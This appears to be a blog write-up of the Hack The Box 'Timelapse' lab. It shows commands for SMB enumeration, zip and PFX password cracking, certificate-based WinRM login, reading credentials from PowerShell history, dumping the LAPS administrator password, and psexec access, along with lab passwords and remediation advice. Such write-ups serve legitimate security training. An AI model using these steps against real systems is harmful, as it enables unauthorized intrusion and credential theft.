# Timelapse

Breaking SSL barriers and exposing hidden history. 100% completion rooted in precision and faith. 🎯🙏

***

### Piercing the Veil of Timelapse: Encrypted Keys & The LAPS Revelation 🛡️

**Breaking SSL barriers and exposing hidden history. 100% completion rooted in precision and faith. 🎯🙏**

![](https://cdn-images-1.medium.com/max/800/1*HTgOojdZR7peGJT-ylJBJQ.png)

**Target:** \*Timelapse (10.129.5.228)\***OS:** _Windows_ **Difficulty:** _Easy_ **Attack Vectors:** _SMB Enumeration -> Archive Cracking -> SSL Certificate Extraction -> WinRM Access -> LAPS Privilege Escalation_

### Executive Summary

**Assessment Date:** _January 30, 2026_ **Risk Level:** _CRITICAL_ **Author:** _R00t3dbyFa17h / Nicholas Mullenski_

**Overview**

An initial assessment of the “Timelapse” server has identified critical vulnerabilities stemming from improper handling of sensitive backup files and weak internal permission structures. The host, running a Windows environment, exposes an SMB share containing encrypted SSL certificates. Initial reconnaissance led to the recovery of a PFX file, which, once cracked, allowed for authentication via WinRM.

**Key Findings (Preliminary):**

* **Information Disclosure:** A backup ZIP file containing a PFX certificate was left accessible on a public SMB share.
* **Weak Cryptography:** The password protecting the SSL certificate was susceptible to dictionary attacks.
* **Cleartext Credentials:** PowerShell history files contained credentials for the service account `svc_deploy`.
* **LAPS Misconfiguration:** The `svc_deploy` user possessed `LAPS_Readers` rights, allowing the retrieval of the local Administrator password.

**Strategic Recommendation (Phase 1):** Immediate remediation involves securing SMB shares to prevent unauthorized access to backup files. Furthermore, the organization must enforce stricter policies regarding the storage of credentials in PowerShell history and review the group membership of service accounts to ensure Least Privilege is maintained.

### 1.0 Initial Foothold

#### 1.1 Enumeration & Reconnaissance

The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities.

**1.1.1 Nmap Scan** A full service and script scan was performed to identify open ports and the software versions running on them.

**Command:** `nmap -sCV -vvv -Pn 10.129.5.228`

```
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-31 01:21:38Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-01-31T01:23:01+00:00; +7h59m59s from scanner time.
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 6285/tcp): CLEAN (Timeout)
|   Check 2 (port 63070/tcp): CLEAN (Timeout)
|   Check 3 (port 16110/udp): CLEAN (Timeout)
|   Check 4 (port 13516/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-31T01:22:21
|_  start_date: N/A
```

**Results:** The scan revealed a classic Domain Controller profile with a significant clock skew (\~8 hours), which can sometimes interfere with Kerberos authentication if not accounted for.

* **Standard AD Ports:** 53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB), 636 (LDAPS).
* **Remote Management:** Port **5986** (WinRM over SSL) is open. This is a critical finding because standard WinRM (5985) is closed, implying we need a valid SSL certificate to connect.

1. **1.2 SMB Enumeration** With Port 445 open, I targeted the SMB service to list available shares, looking for non-default directories.

![](https://cdn-images-1.medium.com/max/800/1*stP_WqD-KSXkm3zYWdVjLg.png)

**Key Findings:** Amidst the standard administrative shares (`ADMIN$`, `C$`, `SYSVOL`), a non-standard share named **`Shares`** was identified. This anomaly immediately became the primary target for further investigation.

#### 1.2 Exploitation: Cracking the Archives

**1.2.1 Archive Extraction** I transferred the `winrm_backup.zip` found inside the `Shares` directory to my attack machine. It was password protected. Using `zip2john`, I extracted the hash and cracked it using the RockYou wordlist.

![](https://cdn-images-1.medium.com/max/800/1*0TB11cVYMZdYRSWlO-ff7A.png)

#### 1.3 Access: Certificate Authentication

**1.3.1 Key & Certificate Separation** We have successfully cracked the PFX password (`thuglegacy`), but `evil-winrm` cannot utilize a raw `.pfx` archive directly. To initiate a secure SSL connection, we must "unbundle" the archive into its core components: the **Private Key** (which proves our identity) and the **Public Certificate** (which validates the server).

> Command # 1

**1.3.2 Extracting the Private Key** We use OpenSSL to extract the key, stripping away the certificate data (`-nocerts`) and ensuring the key itself is not encrypted (`-nodes`) so our tools can use it instantly.

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
```

> Command # 2

**1.3.3 Extracting the Public Certificate** Next, we extract the certificate information while ignoring the private key (`-nokeys`).

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
```

**1.3.4 WinRM Login (SSL)** With our cryptographic material prepared (`priv-key.pem` and `certificate.pem`), we can now target the WinRM service on port 5986. Unlike standard WinRM (port 5985), this service requires SSL authentication. We utilize `evil-winrm` with the `-S` flag to enforce SSL and pass our extracted keys.

```
evil-winrm -i 10.129.5.228 -S -c certificate.pem -k priv-key.pem
```

### 2.0 Local Enumeration

#### **2.1 User Flag**

**2.1.1 Locating the User Flag** Having established a foothold, our first objective is to secure proof of user-level compromise. We navigate to the Desktop of the current user to retrieve the flag.

```
type C:\Users\legacyy\Desktop\user.txt
```

![](https://cdn-images-1.medium.com/max/800/1*TAO92HuJFfhMKGkO4EY5cQ.png)

#### **2.2 Privilege Escalation Discovery**

**2.2.1 PowerShell History Analysis** We are now inside the system, but we are limited to the permissions of a developer. To move laterally or vertically, we need to see what this user has been doing. The most critical artifact in a Windows environment for this is the `ConsoleHost_history.txt` file. This file records the command history of PowerShell sessions, and administrators frequently forget to clear it after typing sensitive credentials.

**Command:**

```
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![](https://cdn-images-1.medium.com/max/800/1*oIMDnWn6RerY2RsL4TJzXw.png)

**Key Finding:** The history file reveals a catastrophic operational security failure. The user executed a script to connect as a different user, creating a `PSCredential` object in plain text.

* **Target User:** `svc_deploy`
* **Leaked Password:** `E3R$Q62^12p7PLlC%KWaxuaV`

**2.2.2 Pivoting to Service Account** We now have credentials for a service account. We disconnect our current session and immediately reconnect using these new credentials to assess what additional privileges this account holds.

```
evil-winrm -i 10.129.5.228 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

**2.3 Exploit Research: LAPS Misconfiguration**

**2.3.1 Group Enumeration** Upon landing as `svc_deploy`, standard enumeration of group memberships is performed to identify vectors for privilege escalation.

```
net user svc_deploy
```

**Results:** The output confirms that `svc_deploy` is a member of the **`LAPS_Readers`** group.

**2.3.2 Vulnerability Analysis** **Microsoft LAPS (Local Administrator Password Solution)** is designed to secure systems by randomizing the local Administrator password periodically and storing it in Active Directory. However, for this system to work, certain accounts must have permission to _read_ that password from AD. Being in the `LAPS_Readers` group grants this account the "Extended Right" to query the `ms-Mcs-AdmPwd` attribute. This means we can simply ask the Domain Controller for the plaintext password of the local Administrator.

**2.4 Exploitation: Reading LAPS Passwords**

**2.4.1 Dumping the Administrator Password** We do not need complex exploits or kernel vulnerabilities here. We utilize the native `ActiveDirectory` PowerShell module to query the computer object for the sensitive attribute.

```
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
```

**Key Finding:** The command returns the `ms-Mcs-AdmPwd` field containing the randomized, clear-text Administrator password.

![](https://cdn-images-1.medium.com/max/800/1*1rJ8RJYf0fqkdl_9BPm3gQ.png)

**2.4.2 The WinRM SSL Trap (Failed Attempt)** Initially, I attempted to authenticate as Administrator using `evil-winrm` on Port 5986. However, the service configuration prioritized the client-side SSL certificate (which belonged to the user `legacyy`) over the provided Administrator credentials. This resulted in a "sticky session" where, despite providing the correct Admin password, the shell kept spawning as `legacyy`.

**Command:** `evil-winrm -i 10.129.5.228 -S -u Administrator -p 'vA3eUSvQG/NgU12Ay!34#X1@' -c certificate.pem -k priv-key.pem`

**Result:** `*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami` -> `timelapse\legacyy` (Privilege Escalation Failed)

**2.4.3 Pivoting to SMB (Impacket)** To bypass the SSL certificate restriction, I targeted the **SMB** protocol (Port 445) instead. SMB authentication does not rely on the client certificate, allowing the Administrator credentials to work independently. I utilized `impacket-psexec` from the attack machine to execute a service-based login.

**Command:** `impacket-psexec Administrator:'vA3eUSvQG/NgU12Ay!34#X1@'@10.129.5.228`

![](https://cdn-images-1.medium.com/max/800/1*bVHOHahtp1U96aSENXwZzA.png)

### 3.0 Post-Exploitation & Loot

**3.1 Proof of Compromise** With full administrative authority established via SMB, we located the root flag. Note that the flag was not in the standard Administrator profile but was hidden in the profile of the user `TRX`.

![](https://cdn-images-1.medium.com/max/800/1*Ex-sK18yDIe47dGPV_pk1A.png)

**Command:** `type C:\Users\TRX\Desktop\root.txt`

### 🛡️ Red Team Mandate: Timelapse Post-Operation Analysis

**Lessons Learned & Tactical Growth**

The primary takeaway from the Timelapse engagement was the necessity of **adaptive protocol pivoting**.

* **The SSL Trap:** We learned that WinRM over SSL (Port 5986) can create a persistent identity map where the certificate dictates the user identity, ignoring provided credentials.
* **The Pivot to SMB:** When WinRM failed to elevate, we immediately pivoted to SMB (Port 445) using `psexec`. This protocol ignores the client-side certificate, allowing the Administrator credentials to work flawlessly.
* **LAPS Weakness:** The entire system was compromised because a service account (`svc_deploy`) was granted "Extended Rights" to read the LAPS password. This turned a single leaked credential into a total domain compromise.

**Engineering Remediation & Defensive Hardening**

To prevent a repeat of this compromise, the following remediations are recommended for the engineering and sysadmin teams:

1. **Restrict LAPS Permissions:** Audit the `LAPS_Readers` group immediately. Service accounts like `svc_deploy` should almost never require access to local administrator passwords.
2. **Sanitize PowerShell History:** Implement a Group Policy Object (GPO) to prevent `ConsoleHost_history.txt` from saving sensitive commands on production servers.
3. **Secrets Management:** The presence of a password-protected zip file containing a certificate suggests a lack of a proper Secrets Management solution. “Security by Zip Password” is not a valid strategy.

### 🕊️ Spiritual Connection: The Treasures of Darkness 📜

As we close the book on Timelapse, we reflect on the nature of what we found. Everything valuable — the SSL certificate, the private key, the Administrator password — was locked away in the dark, hidden inside zipped archives or encrypted attributes. It wasn’t sitting in the light; it had to be wrestled out of the darkness.

> “I will give you hidden treasures, riches stored in secret places, so that you may know that I am the LORD, the God of Israel, who summons you by name.” — Isaiah 45:3

**The Connection:** In this lab, the “treasures” (the credentials) were literally stored in secret places: a hidden `Dev` share and a password-protected zip file. To get them, we had to break the locks. We couldn't just walk in through the front door (Port 80); we had to go into the "dark" encrypted ports (5986) and dig through the hidden history files. The reward wasn't on the surface; it was deep inside the system.

**For us, the lesson is deeper.** Often in our walk with God, we go through seasons that feel dark or restricted — times where the answers seem encrypted and the doors seem locked. But this verse promises that God has placed “riches” in those secret, hard places. The struggles you face in life (like the struggle to pivot from WinRM to SMB) aren’t empty failures; they are the exact places where God has stored the hidden treasure of His wisdom. When we press through the darkness and break the seals, we don’t just find an answer; we find _Him_, knowing that He is the one who called us to the victory.

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [February 15, 2026](https://medium.com/p/716bf0c289bb).

[Canonical link](https://medium.com/@nicholasmullenski/piercing-the-veil-of-timelapse-encrypted-keys-the-laps-revelation-%EF%B8%8F-716bf0c289bb)

Exported from [Medium](https://medium.com) on September 1, 2026.
